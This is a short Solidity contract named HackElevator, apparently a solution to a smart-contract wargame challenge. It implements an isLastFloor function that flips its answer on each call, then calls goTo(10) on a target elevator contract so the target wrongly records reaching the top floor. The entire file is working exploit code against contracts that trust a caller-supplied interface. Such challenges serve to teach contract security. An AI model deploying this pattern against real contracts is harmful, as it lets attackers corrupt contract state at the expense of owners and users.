// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint) external returns (bool);
}

/// @dev Implem the isLastFloor with a counter that change the bool every other time
contract HackElevator is Building {
    address public elevator;
    uint256 public counterAttack;

    constructor(address _elevator) {
        elevator = _elevator;
    }

    function attack() external {
        (bool success,) = elevator.call(abi.encodeWithSignature("goTo(uint256)", 10));
        require(success);
    }

    function isLastFloor(uint) external returns(bool result) {
        result = counterAttack % 2 != 0;
        counterAttack++;
    }
}